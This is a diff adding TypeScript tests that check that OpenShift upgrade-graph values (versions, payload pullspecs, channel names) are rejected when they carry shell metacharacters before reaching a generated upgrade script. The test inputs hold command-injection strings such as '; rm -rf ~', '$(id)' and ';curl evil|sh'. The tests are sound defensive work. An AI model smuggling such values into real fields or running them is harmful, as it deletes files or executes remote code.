@@ -187,6 +187,7 @@ describe('parseRawGraph — malformed/garbage payload rejection', () => {
         ],
       },
     ],
+    ['a node version outside the X.Y.Z[-prerelease][+build] grammar', { version: 1, nodes: [{ version: '4.22', payload: 'p' }], edges: [], conditionalEdges: [] }],
   ])('rejects %s', (_label, input) => {
     const result = parseRawGraph(input, CTX);
     expect(result.ok).toBe(false);
@@ -205,6 +206,82 @@ describe('parseRawGraph — malformed/garbage payload rejection', () => {
   });
 });
 
+// Versions, payloads and channel names are pasted unquoted into the copyable
+// `oc adm upgrade` script (design/commands.ts), so the graph boundary is where
+// shell metacharacters must be stopped.
+describe('graph boundary — values that reach the upgrade script stay shell-safe', () => {
+  const SAFE_PAYLOAD = 'quay.io/openshift-release-dev/ocp-release@sha256:00ff';
+  const rawWith = (node: { version: string; payload: string; channels?: string }) => ({
+    version: 1,
+    nodes: [
+      {
+        version: node.version,
+        payload: node.payload,
+        metadata: node.channels === undefined ? undefined : { 'io.openshift.upgrades.graph.release.channels': node.channels },
+      },
+    ],
+    edges: [],
+    conditionalEdges: [],
+  });
+  const trimmedWith = (node: { version: string; payload: string; channelNames?: string[] }) => ({
+    nodes: [{ version: node.version, payload: node.payload, channels: node.channelNames ? [0] : [] }],
+    edges: [],
+    conditionalEdges: [],
+    channelNames: node.channelNames ?? [],
+  });
+
+  it.each([
+    ['a prerelease with a space and a command', { version: '4.18.0-rc.1 ; rm -rf ~', payload: SAFE_PAYLOAD }],
+    ['a prerelease with command substitution', { version: '4.18.0-$(id)', payload: SAFE_PAYLOAD }],
+    ['build metadata with a pipe', { version: '4.22.1+x|sh', payload: SAFE_PAYLOAD }],
+    ['an empty prerelease identifier', { version: '4.18.0-rc..1', payload: SAFE_PAYLOAD }],
+    ['a payload with a command separator', { version: '4.18.0', payload: `${SAFE_PAYLOAD};curl evil|sh` }],
+    ['a payload with a space', { version: '4.18.0', payload: 'quay.io/x @sha256:00' }],
+    ['a payload that starts like a flag', { version: '4.18.0', payload: '--help' }],
+    ['a channel name with command substitution', { version: '4.18.0', payload: SAFE_PAYLOAD, channels: 'stable-4.18,$(id)' }],
+    ['a channel name with a space', { version: '4.18.0', payload: SAFE_PAYLOAD, channels: 'stable-4.18, stable 4.19' }],
+    ['a channel name that starts like a flag', { version: '4.18.0', payload: SAFE_PAYLOAD, channels: 'stable-4.18,--help' }],
+  ])('parseRawGraph rejects %s', (_label, node) => {
+    const result = parseRawGraph(rawWith(node), CTX);
+    expect(result.ok).toBe(false);
+    if (result.ok) return;
+    expect(result.error.kind).toBe('validation');
+  });
+
+  it.each([
+    ['a version with a backtick', { version: '4.18.0-`id`', payload: SAFE_PAYLOAD }],
+    ['a payload with a quote', { version: '4.18.0', payload: `${SAFE_PAYLOAD}'` }],
+    ['a channel name with a semicolon', { version: '4.18.0', payload: SAFE_PAYLOAD, channelNames: ['stable-4.18;id'] }],
+  ])('parseTrimmedGraph rejects a cached graph with %s', (_label, node) => {
+    const result = parseTrimmedGraph(trimmedWith(node));
+    expect(result.ok).toBe(false);
+    if (result.ok) return;
+    expect(result.error.kind).toBe('validation');
+  });
+
+  it('rejects a long malformed channel list without stalling', () => {
+    const started = performance.now();
+    const result = parseRawGraph(rawWith({ version: '4.18.0', payload: SAFE_PAYLOAD, channels: `${' ,'.repeat(5000)}!` }), CTX);
+    // The old backtracking regex needs far longer than this on 5000 entries; the bound is loose so a busy CI runner can't flake it.
+    expect(performance.now() - started).toBeLessThan(2000);
+    expect(result.ok).toBe(false);
+    if (result.ok) return;
+    expect(result.error.kind).toBe('validation');
+  });
+
+  it('still accepts SemVer prerelease and build identifiers, digest and tag pullspecs, and spaced channel lists', () => {
+    for (const node of [
+      { version: '4.18.0-rc.10', payload: SAFE_PAYLOAD, channels: 'candidate-4.18, fast-4.18' },
+      { version: '4.22.1+build.1', payload: 'registry.example.com:5000/ocp/release:4.22.1-x86_64' },
+      { version: '4.22.1-rc.1+build.5', payload: 'p', channels: '' },
+    ]) {
+      const result = parseRawGraph(rawWith(node), CTX);
+      if (!result.ok) throw result.error;
+      expect(result.value.nodes[0]?.version).toBe(node.version);
+    }
+  });
+});
+
 describe('trimmed-shape round-trip', () => {
   it('survives serialize -> JSON -> parseTrimmedGraph unchanged', () => {
     const parsed = parseRawGraph(loadFixture('stable-4.21.json'), { channel: 'stable-4.21', arch: 'amd64' });
@@ -220,6 +297,18 @@ describe('trimmed-shape round-trip', () => {
 
   it('parseTrimmedGraph rejects corrupt cached data instead of crashing', () => {
     const result = parseTrimmedGraph({ nodes: [{ version: '1.0.0' }], edges: [], conditionalEdges: [] });
+    expect(result.ok).toBe(false);
+    if (result.ok) return;
+    expect(result.error.kind).toBe('validation');
+  });
+
+  it('parseTrimmedGraph rejects a cached node version outside the version grammar', () => {
+    const result = parseTrimmedGraph({
+      nodes: [{ version: 'not-a-version', payload: 'p', channels: [] }],
+      edges: [],
+      conditionalEdges: [],
+      channelNames: [],
+    });
     expect(result.ok).toBe(false);
     if (result.ok) return;
     expect(result.error.kind).toBe('validation');
